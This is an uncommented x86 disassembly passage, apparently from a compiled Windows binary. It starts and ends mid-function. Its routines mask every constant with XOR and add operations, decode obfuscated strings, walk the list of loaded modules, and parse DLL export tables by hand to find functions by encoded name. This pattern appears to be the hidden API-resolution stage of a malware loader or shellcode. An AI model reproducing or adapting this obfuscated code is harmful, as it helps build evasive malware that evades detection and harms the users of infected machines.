  426626:	mov    bx,WORD PTR [ebp-0x4]
  42662a:	xor    edi,esi
  42662c:	add    edi,eax
  42662e:	cmp    bx,di
  426631:	je     0x426725
  426637:	mov    edi,DWORD PTR [ebp-0xc]
  42663a:	mov    ebx,DWORD PTR [ebp+0xc]
  42663d:	xor    edi,ecx
  42663f:	add    edi,edx
  426641:	cmp    ebx,edi
  426643:	mov    di,WORD PTR [ebp-0x4]
  426647:	mov    bx,WORD PTR [ebp+0x8]
  42664b:	je     0x4266b6
  42664d:	cmp    bx,di
  426650:	je     0x4266bf
  426652:	mov    edi,DWORD PTR [ebp-0x20]
  426655:	mov    bx,WORD PTR [ebp+0x8]
  426659:	xor    edi,esi
  42665b:	add    edi,eax
  42665d:	cmp    bx,di
  426660:	jb     0x426680
  426662:	mov    edi,DWORD PTR [ebp-0x2c]
  426665:	mov    bx,WORD PTR [ebp+0x8]
  426669:	xor    edi,esi
  42666b:	add    edi,eax
  42666d:	cmp    bx,di
  426670:	ja     0x426680
  426672:	movzx  edi,WORD PTR [ebp+0x8]
  426676:	movzx  ebx,WORD PTR [ebp-0x8]
  42667a:	add    edi,ebx
  42667c:	mov    WORD PTR [ebp+0x8],di
  426680:	mov    edi,DWORD PTR [ebp-0x20]
  426683:	mov    bx,WORD PTR [ebp-0x4]
  426687:	xor    edi,esi
  426689:	add    edi,eax
  42668b:	cmp    bx,di
  42668e:	jb     0x4266ae
  426690:	mov    edi,DWORD PTR [ebp-0x2c]
  426693:	mov    bx,WORD PTR [ebp-0x4]
  426697:	xor    edi,esi
  426699:	add    edi,eax
  42669b:	cmp    bx,di
  42669e:	ja     0x4266ae
  4266a0:	movzx  edi,WORD PTR [ebp-0x4]
  4266a4:	movzx  ebx,WORD PTR [ebp-0x8]
  4266a8:	add    edi,ebx
  4266aa:	mov    WORD PTR [ebp-0x4],di
  4266ae:	mov    di,WORD PTR [ebp-0x4]
  4266b2:	mov    bx,WORD PTR [ebp+0x8]
  4266b6:	cmp    bx,di
  4266b9:	jne    0x4267b3
  4266bf:	mov    edi,DWORD PTR [ebp-0x1c]
  4266c2:	mov    ebx,DWORD PTR [ebp-0x10]
  4266c5:	xor    edi,ecx
  4266c7:	lea    edi,[edi+ebx*1+0x3272f6]
  4266ce:	mov    DWORD PTR [ebp-0x10],edi
  4266d1:	mov    edi,DWORD PTR [ebp-0x1c]
  4266d4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266d7:	xor    edi,ecx
  4266d9:	lea    edi,[edi+ebx*1+0x3272f6]
  4266e0:	mov    DWORD PTR [ebp-0x14],edi
  4266e3:	mov    edi,DWORD PTR [ebp-0x24]
  4266e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4266e9:	mov    di,WORD PTR [ebx+edi*2]
  4266ed:	mov    WORD PTR [ebp+0x8],di
  4266f1:	mov    edi,DWORD PTR [ebp-0x28]
  4266f4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266f7:	mov    di,WORD PTR [ebx+edi*2]
  4266fb:	mov    WORD PTR [ebp-0x4],di
  4266ff:	mov    edi,DWORD PTR [ebp-0xc]
  426702:	mov    bx,WORD PTR [ebp+0x8]
  426706:	xor    edi,esi
  426708:	add    edi,eax
  42670a:	cmp    bx,di
  42670d:	jne    0x426623
  426713:	mov    eax,DWORD PTR [ebp-0x18]
  426716:	mov    esi,DWORD PTR [ebp-0xc]
  426719:	xor    eax,ecx
  42671b:	add    eax,edx
  42671d:	imul   eax,esi
  426720:	mov    DWORD PTR [ebp-0xc],eax
  426723:	jmp    0x426737
  426725:	mov    eax,DWORD PTR [ebp-0xc]
  426728:	mov    esi,DWORD PTR [ebp-0x18]
  42672b:	xor    eax,ecx
  42672d:	lea    eax,[eax+esi*1+0x3272f6]
  426734:	mov    DWORD PTR [ebp-0x18],eax
  426737:	mov    eax,DWORD PTR [ebp-0x24]
  42673a:	sub    eax,edx
  42673c:	xor    eax,ecx
  42673e:	mov    DWORD PTR [ebp-0x30],eax
  426741:	mov    eax,DWORD PTR [ebp-0x28]
  426744:	sub    eax,edx
  426746:	xor    eax,ecx
  426748:	mov    DWORD PTR [ebp-0x34],eax
  42674b:	mov    eax,DWORD PTR [ebp-0x34]
  42674e:	mov    esi,DWORD PTR [ebp-0x1c]
  426751:	xor    esi,ecx
  426753:	add    esi,edx
  426755:	xor    eax,ecx
  426757:	add    eax,0x3272f6
  42675c:	imul   esi,eax
  42675f:	mov    eax,DWORD PTR [ebp-0x14]
  426762:	movzx  eax,WORD PTR [esi+eax*1]
  426766:	mov    esi,DWORD PTR [ebp-0x30]
  426769:	mov    edi,DWORD PTR [ebp-0x1c]
  42676c:	xor    esi,ecx
  42676e:	add    esi,edx
  426770:	xor    edi,ecx
  426772:	add    edi,edx
  426774:	imul   edi,esi
  426777:	mov    esi,DWORD PTR [ebp-0x10]
  42677a:	movzx  esi,WORD PTR [edi+esi*1]
  42677e:	sub    eax,edx
  426780:	sub    esi,edx
  426782:	xor    eax,ecx
  426784:	xor    esi,ecx
  426786:	cmp    esi,eax
  426788:	jne    0x4267b3
  42678a:	mov    eax,DWORD PTR [ebp-0x30]
  42678d:	mov    esi,DWORD PTR [ebp-0x1c]
  426790:	xor    eax,ecx
  426792:	add    eax,0x3272f6
  426797:	xor    esi,ecx
  426799:	add    esi,edx
  42679b:	imul   esi,eax
  42679e:	mov    eax,DWORD PTR [ebp-0x10]
  4267a1:	movzx  eax,WORD PTR [esi+eax*1]
  4267a5:	mov    esi,DWORD PTR [ebp-0xc]
  4267a8:	sub    eax,edx
  4267aa:	xor    eax,ecx
  4267ac:	cmp    eax,esi
  4267ae:	mov    eax,DWORD PTR [ebp-0xc]
  4267b1:	je     0x4267b6
  4267b3:	mov    eax,DWORD PTR [ebp-0x18]
  4267b6:	pop    edi
  4267b7:	xor    eax,ecx
  4267b9:	pop    esi
  4267ba:	add    eax,edx
  4267bc:	pop    ebx
  4267bd:	leave  
  4267be:	ret    0x8
  4267c1:	push   ebp
  4267c2:	mov    ebp,esp
  4267c4:	push   ecx
  4267c5:	mov    cx,WORD PTR [eax]
  4267c8:	push   esi
  4267c9:	mov    esi,0x3b5d
  4267ce:	sub    cx,si
  4267d1:	mov    esi,0x8a9b
  4267d6:	xor    cx,si
  4267d9:	mov    esi,0x4e38
  4267de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4267e5:	mov    edx,0xf89c85a5
  4267ea:	cmp    cx,si
  4267ed:	je     0x42684c
  4267ef:	push   ebx
  4267f0:	push   edi
  4267f1:	movzx  ecx,cx
  4267f4:	mov    edi,0xffcd8d0a
  4267f9:	mov    esi,0x75108af
  4267fe:	mov    ebx,0x4e64
  426803:	cmp    cx,bx
  426806:	jne    0x42680b
  426808:	mov    DWORD PTR [ebp-0x4],edx
  42680b:	lea    edx,[edi+0x1]
  42680e:	xor    edx,esi
  426810:	mov    edi,edx
  426812:	xor    edi,esi
  426814:	mov    cx,WORD PTR [eax+edi*2+0x64e5ec]
  42681c:	mov    ebx,0x3b5d
  426821:	sub    cx,bx
  426824:	mov    ebx,0x8a9b
  426829:	xor    cx,bx
  42682c:	mov    ebx,0x4e38
  426831:	cmp    cx,bx
  426834:	jne    0x4267fe
  426836:	mov    ecx,DWORD PTR [ebp-0x4]
  426839:	pop    edi
  42683a:	pop    ebx
  42683b:	cmp    ecx,0xf89c85a6
  426841:	je     0x42684c
  426843:	xor    ecx,esi
  426845:	lea    eax,[eax+ecx*2+0x64e5ee]
  42684c:	pop    esi
  42684d:	leave  
  42684e:	ret    
  42684f:	push   ebp
  426850:	mov    ebp,esp
  426852:	push   ecx
  426853:	push   esi
  426854:	push   edi
  426855:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  42685c:	mov    esi,0xf89c85a5
  426861:	call   0x4267c1
  426866:	mov    edi,eax
  426868:	mov    al,BYTE PTR [edi]
  42686a:	sub    al,0x4
  42686c:	xor    al,0x7f
  42686e:	cmp    al,0x83
  426870:	je     0x4268d3
  426872:	mov    eax,edi
  426874:	mov    edx,0xffcd8d0a
  426879:	mov    ecx,0x75108af
  42687e:	push   ebx
  42687f:	mov    ax,WORD PTR [eax]
  426882:	mov    ebx,0x3b5d
  426887:	sub    ax,bx
  42688a:	mov    ebx,0x8a9b
  42688f:	xor    ax,bx
  426892:	mov    ebx,0x4e4a
  426897:	cmp    ax,bx
  42689a:	jne    0x42689f
  42689c:	mov    DWORD PTR [ebp-0x4],esi
  42689f:	lea    esi,[edx+0x1]
  4268a2:	xor    esi,ecx
  4268a4:	mov    edx,esi
  4268a6:	xor    edx,ecx
  4268a8:	lea    eax,[edi+edx*2+0x64e5ec]
  4268af:	mov    bl,BYTE PTR [eax]
  4268b1:	sub    bl,0x4
  4268b4:	xor    bl,0x7f
  4268b7:	cmp    bl,0x83
  4268ba:	jne    0x42687f
  4268bc:	mov    eax,DWORD PTR [ebp-0x4]
  4268bf:	pop    ebx
  4268c0:	cmp    eax,0xf89c85a6
  4268c5:	je     0x4268d3
  4268c7:	xor    eax,ecx
  4268c9:	xor    ecx,ecx
  4268cb:	mov    WORD PTR [edi+eax*2+0x64e5ec],cx
  4268d3:	mov    eax,edi
  4268d5:	pop    edi
  4268d6:	pop    esi
  4268d7:	leave  
  4268d8:	ret    
  4268d9:	push   ebp
  4268da:	mov    ebp,esp
  4268dc:	push   ecx
  4268dd:	push   esi
  4268de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4268e5:	mov    esi,0xf89c85a5
  4268ea:	call   0x4267c1
  4268ef:	mov    cx,WORD PTR [eax]
  4268f2:	mov    edx,0x3b5d
  4268f7:	sub    cx,dx
  4268fa:	mov    edx,0x8a9b
  4268ff:	xor    cx,dx
  426902:	mov    edx,0x4e38
  426907:	cmp    cx,dx
  42690a:	je     0x426963
  42690c:	push   ebx
  42690d:	push   edi
  42690e:	movzx  ecx,cx
  426911:	mov    edx,0xffcd8d0a
  426916:	mov    edi,0x75108af
  42691b:	mov    ebx,0x4e4a
  426920:	cmp    cx,bx
  426923:	jne    0x426928
  426925:	mov    DWORD PTR [ebp-0x4],esi
  426928:	lea    esi,[edx+0x1]
  42692b:	xor    esi,edi
  42692d:	mov    edx,esi
  42692f:	xor    edx,edi
  426931:	mov    cx,WORD PTR [eax+edx*2+0x64e5ec]
  426939:	mov    ebx,0x3b5d
  42693e:	sub    cx,bx
  426941:	mov    ebx,0x8a9b
  426946:	xor    cx,bx
  426949:	mov    ebx,0x4e38
  42694e:	cmp    cx,bx
  426951:	jne    0x42691b
  426953:	cmp    DWORD PTR [ebp-0x4],0xf89c85a6
  42695a:	pop    edi
  42695b:	pop    ebx
  42695c:	je     0x426963
  42695e:	xor    eax,eax
  426960:	inc    eax
  426961:	jmp    0x426965
  426963:	xor    eax,eax
  426965:	pop    esi
  426966:	leave  
  426967:	ret    
  426968:	push   ebp
  426969:	mov    ebp,esp
  42696b:	push   ecx
  42696c:	mov    eax,DWORD PTR [ebp+0x8]
  42696f:	movzx  ecx,WORD PTR [eax]
  426972:	push   esi
  426973:	lea    eax,[ecx-0x3b5d]
  426979:	mov    esi,0x8a9b
  42697e:	push   edi
  42697f:	xor    eax,esi
  426981:	mov    edi,0x4e38
  426986:	mov    DWORD PTR [ebp-0x4],edx
  426989:	cmp    ax,di
  42698c:	je     0x4269b9
  42698e:	mov    eax,DWORD PTR [ebp+0x8]
  426991:	sub    eax,edx
  426993:	mov    DWORD PTR [ebp+0x8],eax
  426996:	jmp    0x42699b
  426998:	mov    eax,DWORD PTR [ebp+0x8]
  42699b:	mov    WORD PTR [edx],cx
  42699e:	add    edx,0x2
  4269a1:	movzx  edi,WORD PTR [eax+edx*1]
  4269a5:	mov    ecx,edi
  4269a7:	add    edi,0xffffc4a3
  4269ad:	xor    edi,esi
  4269af:	mov    eax,0x4e38
  4269b4:	cmp    di,ax
  4269b7:	jne    0x426998
  4269b9:	xor    eax,eax
  4269bb:	pop    edi
  4269bc:	mov    WORD PTR [edx],ax
  4269bf:	mov    eax,DWORD PTR [ebp-0x4]
  4269c2:	pop    esi
  4269c3:	leave  
  4269c4:	ret    0x4
  4269c7:	push   ebp
  4269c8:	mov    ebp,esp
  4269ca:	sub    esp,0x18
  4269cd:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  4269d4:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  4269db:	mov    ecx,DWORD PTR [ebp-0x8]
  4269de:	push   esi
  4269df:	mov    eax,0x75108af
  4269e4:	xor    ecx,eax
  4269e6:	mov    esi,0x3272f6
  4269eb:	add    ecx,esi
  4269ed:	mov    DWORD PTR [ebp-0x4],ecx
  4269f0:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4269f7:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  4269fe:	push   edi
  4269ff:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  426a06:	jmp    0x426aa7
  426a0b:	mov    ecx,DWORD PTR [ebp-0x4]
  426a0e:	mov    edx,DWORD PTR [ebp+0x10]
  426a11:	sub    edx,ecx
  426a13:	mov    ecx,DWORD PTR [ebp-0xc]
  426a16:	xor    ecx,eax
  426a18:	add    ecx,esi
  426a1a:	cmp    edx,ecx
  426a1c:	jbe    0x426a39
  426a1e:	mov    edx,DWORD PTR [ebp-0x4]
  426a21:	add    edx,DWORD PTR [ebp+0x8]
  426a24:	mov    ecx,DWORD PTR [ebp-0x4]
  426a27:	add    ecx,DWORD PTR [ebp+0xc]
  426a2a:	mov    edi,DWORD PTR [ecx]
  426a2c:	mov    DWORD PTR [edx],edi
  426a2e:	mov    ecx,DWORD PTR [ecx+0x4]
  426a31:	mov    DWORD PTR [edx+0x4],ecx
  426a34:	mov    ecx,DWORD PTR [ebp-0xc]
  426a37:	jmp    0x426a86
  426a39:	mov    ecx,DWORD PTR [ebp-0x4]
  426a3c:	mov    edx,DWORD PTR [ebp+0x10]
  426a3f:	sub    edx,ecx
  426a41:	mov    ecx,DWORD PTR [ebp-0x10]
  426a44:	xor    ecx,eax
  426a46:	add    ecx,esi
  426a48:	cmp    edx,ecx
  426a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  426a4d:	jbe    0x426a61
  426a4f:	add    ecx,DWORD PTR [ebp+0x8]
  426a52:	mov    edx,DWORD PTR [ebp-0x4]
  426a55:	add    edx,DWORD PTR [ebp+0xc]
  426a58:	mov    edx,DWORD PTR [edx]
  426a5a:	mov    DWORD PTR [ecx],edx
  426a5c:	mov    ecx,DWORD PTR [ebp-0x10]
  426a5f:	jmp    0x426a86
  426a61:	mov    edx,DWORD PTR [ebp+0x10]
  426a64:	sub    edx,ecx
  426a66:	mov    ecx,DWORD PTR [ebp-0x14]
  426a69:	xor    ecx,eax
  426a6b:	add    ecx,esi
  426a6d:	cmp    edx,ecx
  426a6f:	mov    ecx,DWORD PTR [ebp-0x4]
  426a72:	jbe    0x426a97
  426a74:	add    ecx,DWORD PTR [ebp+0x8]
  426a77:	mov    edx,DWORD PTR [ebp-0x4]
  426a7a:	add    edx,DWORD PTR [ebp+0xc]
  426a7d:	mov    dx,WORD PTR [edx]
  426a80:	mov    WORD PTR [ecx],dx
  426a83:	mov    ecx,DWORD PTR [ebp-0x14]
  426a86:	mov    edx,DWORD PTR [ebp-0x4]
  426a89:	xor    ecx,eax
  426a8b:	lea    ecx,[ecx+edx*1+0x3272f6]
  426a92:	mov    DWORD PTR [ebp-0x4],ecx
  426a95:	jmp    0x426aa7
  426a97:	add    ecx,DWORD PTR [ebp+0x8]
  426a9a:	mov    edx,DWORD PTR [ebp-0x4]
  426a9d:	add    edx,DWORD PTR [ebp+0xc]
  426aa0:	mov    dl,BYTE PTR [edx]
  426aa2:	mov    BYTE PTR [ecx],dl
  426aa4:	inc    DWORD PTR [ebp-0x4]
  426aa7:	mov    ecx,DWORD PTR [ebp-0x18]
  426aaa:	mov    edx,DWORD PTR [ebp+0x10]
  426aad:	xor    ecx,eax
  426aaf:	add    ecx,esi
  426ab1:	imul   ecx,edx
  426ab4:	mov    edx,DWORD PTR [ebp-0x8]
  426ab7:	mov    edi,DWORD PTR [ebp-0x4]
  426aba:	xor    edx,eax
  426abc:	lea    edx,[edx+edi*1+0x3272f6]
  426ac3:	cmp    edx,ecx
  426ac5:	jb     0x426a0b
  426acb:	pop    edi
  426acc:	pop    esi
  426acd:	leave  
  426ace:	ret    0xc
  426ad1:	push   ebp
  426ad2:	mov    ebp,esp
  426ad4:	sub    esp,0xc
  426ad7:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426ade:	push   esi
  426adf:	mov    esi,eax
  426ae1:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  426ae8:	mov    edx,DWORD PTR [ebp-0x4]
  426aeb:	mov    eax,0x75108af
  426af0:	xor    edx,eax
  426af2:	mov    ecx,0x3272f6
  426af7:	add    edx,ecx
  426af9:	cmp    esi,edx
  426afb:	je     0x426b3d
  426afd:	push   ebx
  426afe:	push   edi
  426aff:	mov    edx,DWORD PTR [ebp-0x8]
  426b02:	mov    ebx,DWORD PTR [ebp+0x8]
  426b05:	xor    edx,eax
  426b07:	mov    edi,0xffcd8d0a
  426b0c:	sub    edi,edx
  426b0e:	add    esi,edi
  426b10:	lea    edx,[esi-0x3272f6]
  426b16:	xor    edx,eax
  426b18:	mov    DWORD PTR [ebp-0xc],edx
  426b1b:	mov    edx,DWORD PTR [ebp-0x4]
  426b1e:	mov    edi,DWORD PTR [ebp-0xc]
  426b21:	xor    dl,0xaf
  426b24:	sub    dl,0xa
  426b27:	xor    edi,eax
  426b29:	mov    BYTE PTR [edi+ebx*1+0x3272f6],dl
  426b30:	mov    edx,DWORD PTR [ebp-0x4]
  426b33:	xor    edx,eax
  426b35:	add    edx,ecx
  426b37:	cmp    esi,edx
  426b39:	jne    0x426aff
  426b3b:	pop    edi
  426b3c:	pop    ebx
  426b3d:	pop    esi
  426b3e:	leave  
  426b3f:	ret    0x4
  426b42:	push   ebp
  426b43:	mov    ebp,esp
  426b45:	sub    esp,0x21c
  426b4b:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426b52:	mov    DWORD PTR [ebp-0x14],0xf89c85a4
  426b59:	mov    eax,DWORD PTR [ebp+0x10]
  426b5c:	mov    eax,DWORD PTR [ebp-0x4]
  426b5f:	mov    ecx,DWORD PTR [ebp+0x8]
  426b62:	push   esi
  426b63:	push   edi
  426b64:	mov    edi,0x75108af
  426b69:	xor    eax,edi
  426b6b:	mov    esi,0x3272f6
  426b70:	add    eax,esi
  426b72:	cmp    eax,ecx
  426b74:	mov    eax,DWORD PTR [ebp-0x4]
  426b77:	jne    0x426b82
  426b79:	xor    eax,edi
  426b7b:	add    eax,esi
  426b7d:	jmp    0x426c2e
  426b82:	mov    ecx,DWORD PTR [ebp+0xc]
  426b85:	xor    eax,edi
  426b87:	add    eax,esi
  426b89:	cmp    eax,ecx
  426b8b:	jne    0x426b92
  426b8d:	mov    eax,DWORD PTR [ebp-0x4]
  426b90:	jmp    0x426b79
  426b92:	lea    eax,[ebp-0x21c]
  426b98:	mov    DWORD PTR [ebp-0x8],eax
  426b9b:	mov    eax,DWORD PTR [ebp+0xc]
  426b9e:	mov    DWORD PTR [ebp-0x10],eax
  426ba1:	mov    eax,DWORD PTR [ebp-0x4]
  426ba4:	xor    eax,edi
  426ba6:	add    eax,esi
  426ba8:	mov    DWORD PTR [ebp+0x10],eax
  426bab:	mov    eax,DWORD PTR [ebp+0xc]
  426bae:	push   ebx
  426baf:	call   0x4268d9
  426bb4:	mov    ebx,eax
  426bb6:	mov    eax,DWORD PTR [ebp+0x8]
  426bb9:	mov    eax,DWORD PTR [eax+0x14]
  426bbc:	jmp    0x426c16
  426bbe:	mov    eax,DWORD PTR [ebp+0xc]
  426bc1:	sub    eax,0x8
  426bc4:	mov    DWORD PTR [ebp-0xc],eax
  426bc7:	mov    eax,DWORD PTR [ebp-0xc]
  426bca:	mov    eax,DWORD PTR [eax+0x28]
  426bcd:	call   0x4267c1
  426bd2:	mov    DWORD PTR [ebp+0x10],eax
  426bd5:	push   DWORD PTR [ebp+0x10]
  426bd8:	mov    edx,DWORD PTR [ebp-0x8]
  426bdb:	call   0x426968
  426be0:	mov    eax,DWORD PTR [ebp-0x4]
  426be3:	xor    eax,edi
  426be5:	add    eax,esi
  426be7:	cmp    eax,ebx
  426be9:	jne    0x426bf3
  426beb:	mov    eax,DWORD PTR [ebp-0x8]
  426bee:	call   0x42684f
  426bf3:	mov    eax,DWORD PTR [ebp-0x14]
  426bf6:	xor    eax,edi
  426bf8:	add    eax,esi
  426bfa:	push   eax
  426bfb:	push   DWORD PTR [ebp-0x10]
  426bfe:	mov    eax,DWORD PTR [ebp-0x8]
  426c01:	call   0x42657b
  426c06:	mov    ecx,DWORD PTR [ebp-0x4]
  426c09:	xor    ecx,edi
  426c0b:	add    ecx,esi
  426c0d:	cmp    eax,ecx
  426c0f:	je     0x426c34
  426c11:	mov    eax,DWORD PTR [ebp+0xc]
  426c14:	mov    eax,DWORD PTR [eax]
  426c16:	mov    DWORD PTR [ebp+0xc],eax
  426c19:	mov    eax,DWORD PTR [ebp+0x8]
  426c1c:	mov    ecx,DWORD PTR [ebp+0xc]
  426c1f:	add    eax,0x14
  426c22:	cmp    ecx,eax
  426c24:	jne    0x426bbe
  426c26:	mov    eax,DWORD PTR [ebp-0x4]
  426c29:	xor    eax,edi
  426c2b:	add    eax,esi
  426c2d:	pop    ebx
  426c2e:	pop    edi
  426c2f:	pop    esi
  426c30:	leave  
  426c31:	ret    0xc
  426c34:	mov    eax,DWORD PTR [ebp-0xc]
  426c37:	mov    eax,DWORD PTR [eax+0x18]
  426c3a:	jmp    0x426c2d
  426c3c:	push   ebp
  426c3d:	mov    ebp,esp
  426c3f:	mov    eax,DWORD PTR [ebp+0xc]
  426c42:	sub    esp,0x10
  426c45:	cmp    DWORD PTR [ebp+0x8],0x0
  426c49:	push   ebx
  426c4a:	push   esi
  426c4b:	push   edi
  426c4c:	je     0x426d01
  426c52:	test   eax,eax
  426c54:	je     0x426d01
  426c5a:	movzx  eax,WORD PTR [eax+0x20]
  426c5e:	mov    ecx,eax
  426c60:	mov    DWORD PTR [ebp-0x10],eax
  426c63:	xor    edx,edx
  426c65:	and    DWORD PTR [ebp-0x8],edx
  426c68:	mov    eax,0x8a9b
  426c6d:	xor    ecx,eax
  426c6f:	add    ecx,0x3b5d
  426c75:	mov    DWORD PTR [ebp-0xc],ecx
  426c78:	and    DWORD PTR [ebp-0x4],0x0
  426c7c:	xor    ecx,ecx
  426c7e:	push   0xffffff81
  426c80:	pop    edi
  426c81:	cmp    cx,WORD PTR [ebp-0xc]
  426c85:	jae    0x426ceb
  426c87:	lea    esi,[edx-0x3b5d]
  426c8d:	xor    esi,eax
  426c8f:	movzx  ecx,WORD PTR [ebp-0x4]
  426c93:	mov    ebx,DWORD PTR [ebp+0xc]
  426c96:	lea    ecx,[ebx+ecx*4]
  426c99:	cmp    WORD PTR [ecx+0x2],si
  426c9d:	jne    0x426cd6
  426c9f:	movzx  ecx,WORD PTR [ecx]
  426ca2:	mov    edi,0x4e38
  426ca7:	cmp    cx,di
  426caa:	jne    0x426cb8
  426cac:	mov    ebx,DWORD PTR [ebp+0x8]
  426caf:	movzx  edi,dx
  426cb2:	cmp    BYTE PTR [edi+ebx*1],0x0
  426cb6:	je     0x426ce5
  426cb8:	mov    ebx,DWORD PTR [ebp+0x8]
  426cbb:	movzx  edi,dx
  426cbe:	movsx  di,BYTE PTR [edi+ebx*1]
  426cc3:	mov    ebx,0x3b5d
  426cc8:	sub    di,bx
  426ccb:	xor    di,ax
  426cce:	cmp    cx,di
  426cd1:	je     0x426ce5
  426cd3:	push   0xffffff83
  426cd5:	pop    edi
  426cd6:	inc    DWORD PTR [ebp-0x4]
  426cd9:	mov    cx,WORD PTR [ebp-0xc]
  426cdd:	cmp    WORD PTR [ebp-0x4],cx
  426ce1:	jb     0x426c8f
  426ce3:	jmp    0x426ceb
  426ce5:	inc    DWORD PTR [ebp-0x8]
  426ce8:	push   0xffffff82
  426cea:	pop    edi
  426ceb:	mov    esi,DWORD PTR [ebp+0x8]
  426cee:	movzx  ecx,dx
  426cf1:	cmp    BYTE PTR [ecx+esi*1],0x0
  426cf5:	je     0x426d0a
  426cf7:	inc    edx
  426cf8:	cmp    edi,0xffffff83
  426cfb:	jne    0x426c78
  426d01:	xor    eax,eax
  426d03:	pop    edi
  426d04:	pop    esi
  426d05:	pop    ebx
  426d06:	leave  
  426d07:	ret    0x8
  426d0a:	mov    ecx,DWORD PTR [ebp-0x8]
  426d0d:	add    ecx,0xffffc4a3
  426d13:	xor    cx,ax
  426d16:	xor    eax,eax
  426d18:	cmp    cx,WORD PTR [ebp-0x10]
  426d1c:	sete   al
  426d1f:	jmp    0x426d03
  426d21:	push   ebp
  426d22:	mov    ebp,esp
  426d24:	sub    esp,0x50
  426d27:	push   edi
  426d28:	mov    edi,eax
  426d2a:	mov    eax,DWORD PTR [edi+0x1a8]
  426d30:	cmp    DWORD PTR [eax],0x0
  426d33:	jne    0x426d3c
  426d35:	xor    eax,eax
  426d37:	jmp    0x426e6d
  426d3c:	push   DWORD PTR [ebp+0x8]
  426d3f:	push   0x2c
  426d41:	pop    eax
  426d42:	call   0x426ad1
  426d47:	mov    edx,DWORD PTR [edi+0x1ac]
  426d4d:	lea    eax,[edi+0x22]
  426d50:	mov    DWORD PTR [ebp-0x4c],eax
  426d53:	lea    eax,[edi+0x44]
  426d56:	mov    DWORD PTR [ebp-0x48],eax
  426d59:	lea    eax,[edi+0x66]
  426d5c:	mov    DWORD PTR [ebp-0x44],eax
  426d5f:	lea    eax,[edi+0x88]
  426d65:	mov    DWORD PTR [ebp-0x40],eax
  426d68:	lea    eax,[edi+0xaa]
  426d6e:	mov    DWORD PTR [ebp-0x3c],eax
  426d71:	lea    eax,[edi+0xcc]
  426d77:	mov    DWORD PTR [ebp-0x38],eax
  426d7a:	lea    eax,[edi+0xee]
  426d80:	mov    DWORD PTR [ebp-0x34],eax
  426d83:	lea    eax,[edi+0x110]
  426d89:	mov    DWORD PTR [ebp-0x30],eax
  426d8c:	lea    eax,[edi+0x132]
  426d92:	mov    DWORD PTR [ebp-0x2c],eax
  426d95:	lea    eax,[edi+0x154]
  426d9b:	push   edi
  426d9c:	mov    DWORD PTR [ebp-0x50],edi
  426d9f:	mov    DWORD PTR [ebp-0x28],eax
  426da2:	call   0x426ea1
  426da7:	push   eax
  426da8:	mov    eax,DWORD PTR [edi+0x1a8]
  426dae:	push   DWORD PTR [eax]
  426db0:	call   0x426b42
  426db5:	mov    DWORD PTR [ebp-0x10],eax
  426db8:	test   eax,eax
  426dba:	je     0x426e6d
  426dc0:	mov    ecx,DWORD PTR [eax+0x3c]
  426dc3:	push   ebx
  426dc4:	push   esi
  426dc5:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426dc9:	add    esi,eax
  426dcb:	mov    edi,DWORD PTR [esi+0x24]
  426dce:	mov    ecx,DWORD PTR [esi+0x1c]
  426dd1:	mov    edx,DWORD PTR [esi+0x20]
  426dd4:	mov    ebx,DWORD PTR [esi+0x18]
  426dd7:	add    edi,eax
  426dd9:	mov    DWORD PTR [ebp-0x20],edi
  426ddc:	mov    edi,DWORD PTR [esi+0x14]
  426ddf:	add    ecx,eax
  426de1:	add    edx,eax
  426de3:	mov    DWORD PTR [ebp-0xc],ecx
  426de6:	mov    DWORD PTR [ebp-0x1c],edx
  426de9:	mov    DWORD PTR [ebp-0x8],edi
  426dec:	cmp    edi,ebx
  426dee:	ja     0x426df3
  426df0:	mov    DWORD PTR [ebp-0x8],ebx
  426df3:	xor    ebx,ebx
  426df5:	mov    DWORD PTR [ebp-0x18],ebx
  426df8:	cmp    DWORD PTR [ebp-0x8],ebx
  426dfb:	jbe    0x426e6b
  426dfd:	jmp    0x426e02
  426dff:	mov    edx,DWORD PTR [ebp-0x1c]
  426e02:	mov    edi,DWORD PTR [ebp-0x20]
  426e05:	movzx  edi,WORD PTR [edi+ebx*2]
  426e09:	cmp    ebx,DWORD PTR [esi+0x18]
  426e0c:	jae    0x426e6b
  426e0e:	cmp    edi,DWORD PTR [esi+0x14]
  426e11:	jae    0x426e6b
  426e13:	mov    ebx,DWORD PTR [edx+ebx*4]
  426e16:	mov    edx,DWORD PTR [ebp+0x8]
  426e19:	mov    edi,DWORD PTR [ecx+edi*4]
  426e1c:	mov    DWORD PTR [ebp-0x4],edx
  426e1f:	lea    edx,[ebp-0x50]
  426e22:	add    ebx,eax
  426e24:	add    edi,eax
  426e26:	sub    edx,DWORD PTR [ebp+0x8]
  426e29:	mov    DWORD PTR [ebp-0x14],0xb
  426e30:	mov    DWORD PTR [ebp-0x24],edx
  426e33:	mov    edx,DWORD PTR [ebp-0x4]
  426e36:	cmp    DWORD PTR [edx],0x0
  426e39:	jne    0x426e56
  426e3b:	mov    eax,DWORD PTR [ebp-0x24]
  426e3e:	push   DWORD PTR [eax+edx*1]
  426e41:	push   ebx
  426e42:	call   0x426c3c
  426e47:	mov    ecx,DWORD PTR [ebp-0xc]
  426e4a:	test   eax,eax
  426e4c:	je     0x426e53
  426e4e:	mov    eax,DWORD PTR [ebp-0x4]
  426e51:	mov    DWORD PTR [eax],edi
  426e53:	mov    eax,DWORD PTR [ebp-0x10]
  426e56:	add    DWORD PTR [ebp-0x4],0x4
  426e5a:	dec    DWORD PTR [ebp-0x14]
  426e5d:	jne    0x426e33
  426e5f:	mov    ebx,DWORD PTR [ebp-0x18]
  426e62:	inc    ebx
  426e63:	mov    DWORD PTR [ebp-0x18],ebx
  426e66:	cmp    ebx,DWORD PTR [ebp-0x8]
  426e69:	jb     0x426dff
  426e6b:	pop    esi
